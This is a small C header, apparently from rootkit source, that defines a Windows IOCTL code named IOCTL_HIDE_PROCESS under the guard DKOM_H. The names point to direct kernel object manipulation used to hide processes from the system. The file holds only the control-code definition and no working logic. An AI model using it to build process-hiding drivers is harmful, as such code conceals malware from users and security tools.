#ifndef DKOM_H
#define DKOM_H

#ifndef _NTDDK_
#include <winioctl.h>
#endif

#define IOCTL_HIDE_PROCESS CTL_CODE(FILE_DEVICE_UNKNOWN, 0xA00, METHOD_BUFFERED, FILE_ANY_ACCESS)

#endif
